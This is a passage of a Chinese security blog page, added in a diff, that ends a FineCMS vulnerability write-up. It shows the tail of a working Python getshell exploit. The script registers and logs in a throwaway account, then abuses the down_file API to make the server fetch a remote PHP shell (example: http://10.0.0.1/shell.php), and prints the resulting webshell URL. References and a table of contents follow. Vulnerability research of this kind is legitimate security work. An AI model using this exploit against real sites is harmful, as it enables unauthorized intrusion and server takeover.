+        email<span style="color:#f92672">.</span>append(random<span style="color:#f92672">.</span>choice(seed))
+    email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(email)
+
+    <span style="color:#75715e"># step 1 register</span>
+    register_url <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/index.php?s=member&amp;c=register&amp;m=index&#34;</span>
+    register_payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;back&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;data[username]&#34;</span>: username, <span style="color:#e6db74">&#34;data[password]&#34;</span>: <span style="color:#e6db74">&#34;123456&#34;</span>, <span style="color:#e6db74">&#34;data[password2]&#34;</span>: <span style="color:#e6db74">&#34;123456&#34;</span>,
+                        <span style="color:#e6db74">&#34;data[email]&#34;</span>: email <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">+</span> email <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.com&#34;</span>}
+    <span style="color:#75715e"># step 2 login</span>
+    login_url <span style="color:#f92672">=</span> target <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/index.php?s=member&amp;c=login&amp;m=index&#34;</span>
+    login_payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;back&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;data[username]&#34;</span>: username, <span style="color:#e6db74">&#34;data[password]&#34;</span>: <span style="color:#e6db74">&#34;123456&#34;</span>, <span style="color:#e6db74">&#34;data[auto]&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>}
+
+    url <span style="color:#f92672">=</span> target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/index.php?s=member&amp;c=api&amp;m=down_file&#34;</span>
+    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;url&#34;</span>:<span style="color:#e6db74">&#34;code=ad3eXTkH4Wt084pW46p7DBSt1KX0FwthAs4o9oBH8WVi&#34;</span>,<span style="color:#e6db74">&#34;file&#34;</span>:rtarget}
+    <span style="color:#75715e"># step 3 start hacking&#34;</span>
+    s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+    s<span style="color:#f92672">.</span>post(register_url, data<span style="color:#f92672">=</span>register_payload)
+    s<span style="color:#f92672">.</span>post(login_url, data<span style="color:#f92672">=</span>login_payload)
+    res<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>payload)<span style="color:#f92672">.</span>content
+    hjson <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(res)
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;php&#34;</span> <span style="color:#f92672">in</span> res:
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;shell:&#34;</span><span style="color:#f92672">+</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/uploadfile/&#34;</span><span style="color:#f92672">+</span>time<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#34;%Y%m&#34;</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span>hjson[<span style="color:#e6db74">&#39;name&#39;</span>]
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;failure&#34;</span>
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">5</span>:
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;python down_file_getshell.py -h http://127.0.0.1 -r http://10.0.0.1/shell.php&#39;</span>
+<span style="color:#66d9ef">else</span>:
+    target <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
+    rtarget <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">4</span>]
+    exploit(target,rtarget)
+</code></pre></div><h1 id="结束">结束</h1>
+<p><code>02:13:53</code>
+为了赶这篇文章现在已经深夜了，为了实现自己的承诺，坚持下去！</p>
+<h1 id="参考">参考</h1>
+<p><a href="http://0day5.com/archives/4405/">http://0day5.com/archives/4405/</a></p>
+<p><a href="https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py">https://github.com/F0r3at/Python-Tools/blob/master/finecms/down_file_getshell.py</a></p>
+<p><a href="http://php.net/manual/">http://php.net/manual/</a></p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
+                            前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e8%af%a6%e6%83%85">
+                            漏洞详情
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e4%bb%a3%e7%a0%81%e4%bd%8d%e7%bd%ae%e5%92%8c%e4%bb%a3%e7%a0%81">
+                            代码位置和代码
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e8%bf%87%e7%a8%8b">
+                            执行过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#payload%e4%bb%a3%e7%a0%81">
+                            Payload代码
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c">
+                            执行结果
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
+                            分析过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0%e6%89%a9%e5%b1%95%e5%90%8d%e5%8f%82%e6%95%b0">
+                            构造扩展名参数
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0file%e5%8f%82%e6%95%b0">
+                            构造file参数
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e7%94%a8python%e5%86%99getshell%e8%84%9a%e6%9c%ac">
+                            用Python写Getshell脚本
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e7%bb%93%e6%9d%9f">
+                            结束
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%8f%82%e8%80%83">
+                            参考
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
